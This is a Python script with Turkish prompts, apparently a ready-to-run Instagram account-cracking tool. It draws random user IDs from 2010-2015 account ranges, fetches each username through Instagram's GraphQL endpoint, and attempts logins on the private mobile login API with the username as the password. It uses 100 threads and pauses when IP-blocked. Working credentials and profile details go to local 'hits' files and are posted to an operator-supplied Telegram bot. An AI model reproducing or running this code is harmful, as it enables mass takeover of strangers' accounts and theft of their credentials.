import requests
import os
import random
import time
import sys
import string
import json
import threading
import webbrowser
from uuid import uuid4
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from colorama import Fore, init
from user_agent import generate_user_agent as uu

init(autoreset=True)
Con = Console()

K = '\033[1;31m'
Y = '\033[1;32m'
S = '\033[1;33m'
M = '\033[1;36m'
G = '\033[1;97m'
H = '\x1b[38;5;208m'

a = 0
u = 0
z = 0
j = 0
ip_block = 0
Ex = 0
uid = str(uuid4())
counters_initialized = False
console_lock = threading.Lock()



chat_id = input("Telegram Chat ID gir: ")
webbrowser.open("https://t.me/+bzI8MHf7lOFmN2I0")
bot_token = input("Telegram Bot Token gir: ")

year_ranges = {
    2010: (100000, 1278889),
    2011: (1279000, 17750000),
    2012: (17750001, 279760000),
    2013: (279760001, 900990000),
    2014: (900990001, 1629010000),
    2015: (1629010001, 2369359761)
}

while True:
    try:
        year_input = input("Tarih seçin (ör: 2012 veya 2010-2015): ").replace(" ", "")
        if '-' in year_input:
            start_year, end_year = map(int, year_input.split("-"))
            if start_year <= end_year and start_year in year_ranges and end_year in year_ranges:
                id_min = year_ranges[start_year][0]
                id_max = year_ranges[end_year][1]
                break
        else:
            single_year = int(year_input)
            if single_year in year_ranges:
                id_min, id_max = year_ranges[single_year]
                break
        print("Lütfen 2010-2016 arasında geçerli bir yıl veya yıl aralığı girin (ör: 2012 veya 2011-2013).")
    except ValueError:
        print("Lütfen geçerli bir yıl veya yıl aralığı girin (ör: 2012 veya 2011-2013).")

def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {'chat_id': chat_id, 'text': msg}
        requests.post(url, data=payload)
    except Exception as e:
        pass

def gdate(user_id):
    try:
        base_timestamp = 1279312000
        id_increment = int(user_id) / 1000000
        estimated_timestamp = base_timestamp + (id_increment * 86400 * 30)
        return time.strftime('%Y-%m-%d', time.gmtime(estimated_timestamp))
    except:
        return 'Bilinmiyor'

def konusurlar_check(username, pasw, user_info):
    global a, u, z, j, ip_block, counters_initialized
    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
    headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'
    }
    data = {
        'uuid': uid,
        'password': pasw,
        'username': username,
        'device_id': uid,
        'from_reg': 'false',
        '_csrftoken': 'missing',
        'login_attempt_countn': '0'
    }

    try:
        rii = requests.post(url, headers=headers, data=data, timeout=15)
        re = rii.text

        with console_lock:
            if not counters_initialized:
                os.system('cls' if os.name == 'nt' else 'clear')
                sys.stdout.write(f"{Y}HİT : [ {a:>3} ]\n")
                sys.stdout.write(f"{S}Doğrulama : [ {u:>3} ]\n")
                sys.stdout.write(f"{K}Bad password : [ {z:>3} ]\n")
                sys.stdout.write(f"By @cevpy\n")
                counters_initialized = True
                sys.stdout.flush()

            sys.stdout.write(f"\033[1;1H")
            sys.stdout.write(f"{Y}HİT : [ {a:>3} ]\n")
            sys.stdout.write(f"{S}Doğrulama : [ {u:>3} ]\n")
            sys.stdout.write(f"{K}Bad password : [ {z:>3} ]\n")
            sys.stdout.write(f"{M}By @cevpy")
            sys.stdout.flush()
            time.sleep(0.01)

        if '"error_type":"ip_block"' in re:
            with console_lock:
                ip_block += 1
                sys.stdout.write(f"\033[1;1H")
                sys.stdout.write(f"{Y}HİT : [ {a:>3} ]\n")
                sys.stdout.write(f"{S}Doğrulama : [ {u:>3} ]\n")
                sys.stdout.write(f"{K}Bad password : [ {z:>3} ]\n")
                sys.stdout.write(f"{M}By @cevpy")
                sys.stdout.flush()
                time.sleep(0.01)
            time.sleep(10)
            return

        user_id = user_info.get('pk', 'Bilinmiyor')
        full_name = user_info.get('full_name', 'Bilinmiyor')
        followers = user_info.get('follower_count', 0)
        following = user_info.get('following_count', 0)
        posts = user_info.get('media_count', 0)
        is_private = user_info.get('is_private', False)
        bio = user_info.get('biography', 'Yok')

        output = (
            f"Yeni Hit! #{a + u}\n"
            f"Kullanıcı: @{username}\n"
            f"Şifre: {pasw}\n"
            f"Takipçi: {followers}\n"
            f"Takip: {following}\n"
            f"Gönderi: {posts}\n"
            f"Özel: {is_private}\n"
            f"Bio: {bio}\n"
            f"Tarih: {gdate(user_id)}\n"
            f"URL: https://www.instagram.com/{username}\n"
            f"By : @cevpy"
        )

        if '"logged_in_user"' in re:
            with console_lock:
                a += 1
                sys.stdout.write(f"\033[1;1H")
                sys.stdout.write(f"{Y}HİT : [ {a:>3} ]\n")
                sys.stdout.write(f"{S}Doğrulama : [ {u:>3} ]\n")
                sys.stdout.write(f"{K}Bad password : [ {z:>3} ]\n")
                sys.stdout.write(f"{M}By @cevpy")
                sys.stdout.flush()
                time.sleep(0.01)
            with open('cevahir_hits.txt', 'a') as f:
                f.write(f"\n\n{output}\n")
            with open('hitlog.txt', 'a') as log:
                log.write(f"\n\n[Hit - {username}] API Response:\n{re}\n")
            send_telegram(output)

        elif '"challenge_required"' in re:
            with console_lock:
                u += 1
                sys.stdout.write(f"\033[1;1H")
                sys.stdout.write(f"{Y}HİT : [ {a:>3} ]\n")
                sys.stdout.write(f"{S}Doğrulama : [ {u:>3} ]\n")
                sys.stdout.write(f"{K}Bad password : [ {z:>3} ]\n")
                sys.stdout.write(f"By @cevpy")
                sys.stdout.flush()
                time.sleep(0.01)
            with open('cevahir_hits.txt', 'a') as f:
                f.write(f"\n\n{output}\n")
            with open('hitlog.txt', 'a') as log:
                log.write(f"\n\n[Doğrulama - {username}]\n")
            send_telegram(output)

        else:
            with console_lock:
                z += 1
                sys.stdout.write(f"\033[1;1H")
                sys.stdout.write(f"{Y}HİT : [ {a:>3} ]\n")
                sys.stdout.write(f"{S}Doğrulama : [ {u:>3} ]\n")
                sys.stdout.write(f"{K}Bad password : [ {z:>3} ]\n")
                sys.stdout.write(f"By @cevpy")
                sys.stdout.flush()
                time.sleep(0.01)

    except Exception as e:
        with console_lock:
            j += 1
            sys.stdout.write(f"\033[1;1H")
            sys.stdout.write(f"{Y}HİT : [ {a:>3} ]\n")
            sys.stdout.write(f"{S}Doğrulama : [ {u:>3} ]\n")
            sys.stdout.write(f"{K}Bad password : [ {z:>3} ]\n")
            sys.stdout.write(f"{M}By @cevpy")
            sys.stdout.flush()
            time.sleep(0.01)

def konusurlar_users():
    global Ex
    try:
        LsD = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
        UseriD = str(random.randrange(id_min, id_max))
        vars = json.dumps({'id': UseriD, 'render_surface': 'PROFILE'})
        resp = requests.post(
            'https://www.instagram.com/api/graphql',
            headers={'X-FB-LSD': LsD},
            data={'lsd': LsD, 'variables': vars, 'doc_id': '25618261841150840'},
            timeout=5
        )
        user_data = resp.json()['data']['user']
        if not user_data:
            return
        username = user_data.get('username')
        if not username:
            return
        Ex += 1
        open('cevahir_list.txt', 'a').write(f"{username}:{username}\n")
        konusurlar_check(username, username, user_data)
    except:
        pass

threads = []
for _ in range(100):
    t = threading.Thread(target=lambda: [konusurlar_users() for _ in range(1000)])
    t.start()
    threads.append(t)
for t in threads:
    t.join()
